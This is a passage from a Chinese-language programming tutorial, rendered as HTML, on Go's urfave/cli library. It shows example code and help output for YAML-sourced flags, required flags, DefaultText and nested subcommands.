punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\tAction<span class=\"token punctuation\">:</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>ctx <span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"--test value.*default: 0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test2:\"</span><span class=\"token punctuation\">,</span> ctx<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test:\"</span><span class=\"token punctuation\">,</span> ctx<span class=\"token punctuation\">.</span><span class=\"token function\">Int</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"child-key2:\"</span><span class=\"token punctuation\">,</span> ctx<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"key.child-key2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"child-key2:\"</span><span class=\"token punctuation\">,</span> ctx<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"child-key2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\tBefore<span class=\"token punctuation\">:</span> altsrc<span class=\"token punctuation\">.</span><span class=\"token function\">InitInputSourceWithContext</span><span class=\"token punctuation\">(</span>flags<span class=\"token punctuation\">,</span> altsrc<span class=\"token punctuation\">.</span><span class=\"token function\">NewYamlSourceFromFlagFunc</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"load\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tFlags<span class=\"token punctuation\">:</span>  flags<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\terr <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Err</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Msg</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"run error\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ go run main.go</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token parameter variable\">--test</span> value.*default: <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>test2: TTAA</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>test: <span class=\"token number\">1234</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>child-key2: value2</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>child-key2: value2</pre></td></tr></table></figure><p>如果要读取 yaml 里的变量，需要定义一个 <code>altsrc.NewStringFlag</code>  生成的 flag，里面包含一个 <code>FlagSet</code></p>\n<p>如果 yaml 变量是层级关系，则可以使用点进行间隔，如 <code>key.child-key2</code> , 也可以通过设置别名，在 Action 中进行获取。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Before<span class=\"token punctuation\">:</span> altsrc<span class=\"token punctuation\">.</span><span class=\"token function\">InitInputSourceWithContext</span><span class=\"token punctuation\">(</span>flags<span class=\"token punctuation\">,</span> altsrc<span class=\"token punctuation\">.</span><span class=\"token function\">NewYamlSourceFromFlagFunc</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"load\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr></table></figure><p>这个函数的主要目的是 在程序开始前，初始化 flags 参数</p>\n<p><code>NewYamlSourceFromFlagFunc</code>  中的  <code>load</code>  其实也是 flag 的值，支持通过命令行进行初始化。demo 中使用的是默认的值</p>\n<h2 id=\"必要选项\"><a class=\"anchor\" href=\"#必要选项\">#</a> 必要选项</h2>\n<p>flag 里加 Required</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    app <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        Flags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>cli<span class=\"token punctuation\">.</span>Flag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>StringFlag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                Name<span class=\"token punctuation\">:</span>     <span class=\"token string\">\"lang\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                Value<span class=\"token punctuation\">:</span>    <span class=\"token string\">\"english\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                Usage<span class=\"token punctuation\">:</span>    <span class=\"token string\">\"language for the greeting\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                Required<span class=\"token punctuation\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        Action<span class=\"token punctuation\">:</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>cCtx <span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            output <span class=\"token operator\">:=</span> <span class=\"token string\">\"Hello\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">if</span> cCtx<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"lang\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"spanish\"</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                output <span class=\"token operator\">=</span> <span class=\"token string\">\"Hola\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        log<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"帮助文本中的默认值\"><a class=\"anchor\" href=\"#帮助文本中的默认值\">#</a> 帮助文本中的默认值</h2>\n<p>默认情况下，帮助文本中选项的默认值显示为 <code>Value</code>  字段值。有些时候， <code>Value</code>  并不是实际的默认值。这时，我们可以通过 <code>DefaultText</code>  设置：</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  app <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Flags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>cli<span class=\"token punctuation\">.</span>Flag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>IntFlag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        Name<span class=\"token punctuation\">:</span>     <span class=\"token string\">\"port\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        Value<span class=\"token punctuation\">:</span>    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        Usage<span class=\"token punctuation\">:</span>    <span class=\"token string\">\"Use a randomized port\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        DefaultText <span class=\"token punctuation\">:</span><span class=\"token string\">\"random\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    log<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上面代码逻辑中，如果 <code>Value</code>  设置为 0 就随机一个端口，这时帮助信息中 <code>default: 0</code>  就容易产生误解了。通过 <code>DefaultText</code>  可以避免这种情况：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$go</span> run main.go <span class=\"token parameter variable\">--help</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>NAME:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   default-text - A new cli application</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>USAGE:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   default-text <span class=\"token punctuation\">[</span>global options<span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">[</span>command options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>arguments<span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>COMMANDS:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   help, h  Shows a list of commands or <span class=\"token builtin class-name\">help</span> <span class=\"token keyword\">for</span> one <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>GLOBAL OPTIONS:</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token parameter variable\">--port</span> value  Use a randomized port <span class=\"token punctuation\">(</span>default: random<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   --help, <span class=\"token parameter variable\">-h</span>    show <span class=\"token builtin class-name\">help</span> <span class=\"token punctuation\">(</span>default: <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"子命令\"><a class=\"anchor\" href=\"#子命令\">#</a> 子命令</h1>\n<p>类似于 git ,git 里就有大量的命令，很多以某个命令下的子命令存在。例如 <code>git remote</code>  命令下有 <code>add/rename/remove</code>  等子命令， <code>git submodule</code>  下有 <code>add/status/init/update</code>  等子命令。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    app <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        Commands<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Command<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                Name<span class=\"token punctuation\">:</span>    <span class=\"token string\">\"add\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                Aliases<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                Usage<span class=\"token punctuation\">:</span>   <span class=\"token string\">\"add a task to the list\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                Action<span class=\"token punctuation\">:</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>cCtx <span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"added task: \"</span><span class=\"token punctuation\">,</span> cCtx<span class=\"token punctuation\">.</span><span class=\"token function\">Args</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">First</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                    <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                Name<span class=\"token punctuation\">:</span>    <span class=\"token string\">\"complete\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                Aliases<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                Usage<span class=\"token punctuation\">:</span>   <span class=\"token string\">\"complete a task on the list\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                Action<span class=\"token punctuation\">:</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>cCtx <span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"completed task: \"</span><span class=\"token punctuation\">,</span> cCtx<span class=\"token punctuation\">.</span><span class=\"token function\">Args</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">First</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                    <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                Name<span class=\"token punctuation\">:</span>    <span class=\"token string\">\"template\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                Aliases<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"t\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                Usage<span class=\"token punctuation\">:</span>   <span class=\"token string\">\"options for task templates\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                Subcommands<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Command<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                        Name<span class=\"token punctuation\">:</span>  <span class=\"token string\">\"add\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                        Usage<span class=\"token punctuation\">:</span> <span class=\"token string\">\"add a new template\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                        Action<span class=\"token punctuation\">:</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>cCtx <span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                            fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"new task template: \"</span><span class=\"token punctuation\">,</span> cCtx<span class=\"token punctuation\">.</span><span class=\"token function\">Args</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">First</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                            <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                        Name<span class=\"token punctuation\">:</span>  <span class=\"token string\">\"remove\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                        Usage<span class=\"token punctuation\">:</span> <span class=\"token string\">\"remove an existing template\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                        Action<span class=\"token punctuation\">:</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>cCtx <span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                            fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"removed task template: \"</span><span class=\"token punctuation\">,</span> cCtx<span class=\"token punctuation\">.</span><span class=\"token function\">Args</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">First</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                            <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        log<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$go</span> run main.go <span class=\"token parameter variable\">-h</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>NAME:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   main - A new cli application</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>USAGE:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   main <span class=\"token punctuation\">[</span>global options<span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">[</span>command options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>arguments<span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>COMMANDS:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   add, a       <span class=\"token function\">add</span> a task to the list</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   complete, c  complete a task on the list</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   template, t  options <span class=\"token keyword\">for</span> task templates</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   help, h      Shows a list of commands or <span class=\"token builtin class-name\">help</span> <span class=\"token keyword\">for</span> one <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>GLOBAL OPTIONS:</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   --help, <span class=\"token parameter variable\">-h</span>  show <span class=\"token builtin class-name\">help</span></pre></td></tr></table></figure><p>子命令默认不显示在帮助信息中，需要显式调用子命令所属命令的帮助</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ go run main.go <span class=\"token function\">add</span> <span class=\"token parameter variable\">-h</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>NAME:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   main <span class=\"token function\">add</span> - <span class=\"token function\">add</span> a task to the list</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>USAGE:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   main <span class=\"token function\">add</span> <span class=\"token punctuation\">[</span>command options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>arguments<span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>OPTIONS:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   --help, <span class=\"token parameter variable\">-h</span>  show <span class=\"token builtin 